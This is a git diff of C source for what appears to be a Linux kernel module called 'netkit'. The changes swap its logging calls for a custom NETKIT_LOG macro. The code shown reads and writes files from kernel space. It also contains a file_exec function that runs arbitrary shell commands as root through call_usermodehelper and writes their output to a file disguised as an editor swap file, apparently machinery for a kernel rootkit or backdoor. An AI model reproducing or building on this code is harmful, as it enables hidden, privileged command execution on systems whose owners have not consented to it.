@@ -4,7 +4,10 @@
 #include <linux/fs.h>
 #include <linux/umh.h>
 
-#include "../sys/mem.h"
+#include "file.h"
+
+#include "mem.h"
+#include "debug.h"
 
 int file_read(const char* filename, u8 **out_buf, size_t *out_buflen)
 {
@@ -12,11 +15,11 @@ int file_read(const char* filename, u8 **out_buf, size_t *out_buflen)
     char *tmp_buf;
     int retv = 0;
 
-    pr_err("[*] going to open file\n");
+    NETKIT_LOG("[*] going to open file\n");
     file = filp_open(filename, O_RDONLY | (force_o_largefile() ? O_LARGEFILE : 0), 0);
     if (IS_ERR(file))
     {
-        pr_err("[!] failed to open file\n");
+        NETKIT_LOG("[!] failed to open file\n");
         return PTR_ERR(file);
     }
 
@@ -27,11 +30,11 @@ int file_read(const char* filename, u8 **out_buf, size_t *out_buflen)
         goto LAB_OUT_NO_FILP;
     }
 
-    pr_err("[*] reading file '%s'...\n", filename);
+    NETKIT_LOG("[*] reading file '%s'...\n", filename);
     retv = kernel_read(file, tmp_buf, 4096, NULL);
     if (retv < 0)
     {
-        pr_err("[!] failed to read file\n");
+        NETKIT_LOG("[!] failed to read file\n");
         goto LAB_OUT;
     }
 
@@ -50,11 +53,11 @@ int file_read(const char* filename, u8 **out_buf, size_t *out_buflen)
 
     while (retv == 4096)
     {
-        pr_err("[*] reading more file...\n");
+        NETKIT_LOG("[*] reading more file...\n");
         retv = kernel_read(file, tmp_buf, 4096, NULL);
         if (retv < 0)
         {
-            pr_err("[!] failed to read bytes\n");
+            NETKIT_LOG("[!] failed to read bytes\n");
             goto LAB_OUT;
         }
     
@@ -82,23 +85,23 @@ int file_write(const char *filename, const u8 *content, size_t content_len)
     file = filp_open(filename, O_WRONLY | O_CREAT | O_TRUNC, 0);
     if (IS_ERR(file))
     {
-        pr_err("[!] failed to open file\n");
+        NETKIT_LOG("[!] failed to open file\n");
         return PTR_ERR(file);
     }
 
-    pr_err("[*] writing to '%s' size: %ld\n", filename, content_len);
+    NETKIT_LOG("[*] writing to '%s' size: %ld\n", filename, content_len);
     retv = kernel_write(file, content, content_len, 0);
     filp_close(file, NULL);
     if (retv < 0)
     {
-        pr_err("[!] failed to write to file\n");
+        NETKIT_LOG("[!] failed to write to file\n");
         return retv;
     }
     
     return retv;
 }
 
-int file_exec(char *cmd, u8 **out_buf, size_t *out_buflen)
+int file_exec(const char *cmd, u8 **out_buf, size_t *out_buflen)
 {
     #define SHELL_PATH "/bin/bash"
     #define STDOUT_FILE "/tmp/fb0.swp"
@@ -118,13 +121,13 @@ int file_exec(char *cmd, u8 **out_buf, size_t *out_buflen)
 
     sprintf(argv[2], "%s%s", cmd, BASH_POSTFIX);
 
-    pr_err("[*] executing: \"%s %s '%s'\"\n", argv[0], argv[1], argv[2]);
+    NETKIT_LOG("[*] executing: \"%s %s '%s'\"\n", argv[0], argv[1], argv[2]);
     cmd_retv = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
     
     kzfree(argv[2], bash_cmd_len);
 
     retv = file_read(STDOUT_FILE, out_buf, out_buflen);
-    pr_err("[+] read %d bytes\n", retv);
+    NETKIT_LOG("[+] read %d bytes\n", retv);
     if (retv < 0)
         return retv;
 
